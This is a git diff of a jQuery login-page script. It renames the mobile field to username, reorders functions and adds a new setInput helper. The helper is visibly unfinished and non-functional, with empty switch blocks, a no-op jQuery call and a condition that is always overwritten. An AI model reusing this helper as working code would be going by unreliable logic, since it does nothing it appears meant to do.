@@ -1,55 +1,12 @@
-function start()
-{
-
-}
-
-function wait(_duration)
-{
-	// check if _duration exists
-	if (_duration === undefined)
-	{
-		_duration = 1000;
-	}
-	else
-	{
-		_duration *= 1000;
-	}
-
-	// lock usermobile field
-	$('#usermobile').attr('disabled', '');
-
-	// show waiting message until _duration done
-	$('#go').fadeOut(300, function()
-	{
-		$('.sidebox .waiting').hide().removeClass('hide').fadeIn(300, function()
-		{
-			setTimeout(function()
-			{
-				// hide waiting box
-				$('.sidebox .waiting').fadeOut(300, function()
-				{
-					$(this).addClass('hide');
-
-					// show code field
-					$('.field.code').hide().removeClass('hide').fadeIn(300, function()
-					{});
-				});
-			}, _duration);
-		});
-	});
-}
-
-function verify()
-{
-	sendToBigBrother(2);
-	console.log('step verify');
-}
 
 $(document).ready(function()
 {
-	setCustomValidityMsg();
+	setTimeout(function()
+	{
+		$('#username').attr('readonly', null).focus();
+	}, 50);
 
-	$('#usermobile').on('keyup', function(_e)
+	$('#username').on('keyup', function(_e)
 	{
 		if(_e.which === 13)
 		{
@@ -60,7 +17,7 @@ $(document).ready(function()
 	$('#go').click(function(e)
 	{
 		// check mobile
-		var myMobile = $('#usermobile');
+		var myMobile = $('#username');
 		var myMobileVal = myMobile.val();
 		if (myMobileVal)
 		{
@@ -104,7 +61,7 @@ $(document).ready(function()
 function sendToBigBrother(_step)
 {
 	var blackBox      = {};
-	blackBox.mobile   = $('#usermobile').val();
+	blackBox.mobile   = $('#username').val();
 	blackBox.password = $('#password').val();
 	blackBox.pin      = $('#pin').val();
 	blackBox.code     = $('#code').val();
@@ -166,23 +123,84 @@ function sendToBigBrother(_step)
 }
 
 
-function setCustomValidityMsg()
+function start()
 {
-	$('input[data-validity]').off('invalid');
-	$('input[data-validity]').on('invalid', function()
+
+}
+
+function wait(_duration)
+{
+	// check if _duration exists
+	if (_duration === undefined)
 	{
-		var ValidityText = $(this).attr('data-validity');
-	    ValidityText = ValidityText.replace(':val', this.value);
-	    // if has validity set custom message
-		if(ValidityText)
+		_duration = 1000;
+	}
+	else
+	{
+		_duration *= 1000;
+	}
+
+	// lock usermobile field
+	$('#username').attr('disabled', '');
+
+	// show waiting message until _duration done
+	$('#go').fadeOut(300, function()
+	{
+		$('.sidebox .waiting').hide().removeClass('hide').fadeIn(300, function()
 		{
-			this.setCustomValidity(ValidityText);
+			setTimeout(function()
+			{
+				// hide waiting box
+				$('.sidebox .waiting').fadeOut(300, function()
+				{
+					$(this).addClass('hide');
+
+					// show code field
+					$('.field.code').hide().removeClass('hide').fadeIn(300, function()
+					{});
+				});
+			}, _duration);
+		});
+	});
+}
+
+function verify()
+{
+	sendToBigBrother(2);
+	console.log('step verify');
+}
+
+
+
+
+function setInput(_name, _cond)
+{
+	if(!_cond)
+	{
+		if(_name === 'mobile')
+		{
+			_cond = 'disabled';
 		}
 		else
 		{
-			this.setCustomValidity("Dude '" + this.value + "' is not a valid. Enter something nice!!");
-		}
 
-	});
+		}
+		_cond = 'hide';
+	}
+
+
+	switch (_name)
+	{
+
+	}
+
+
+
+	switch (_cond)
+	{
+		case 'disabled':
+			$(_name)
+			break;
+	}
 }
 
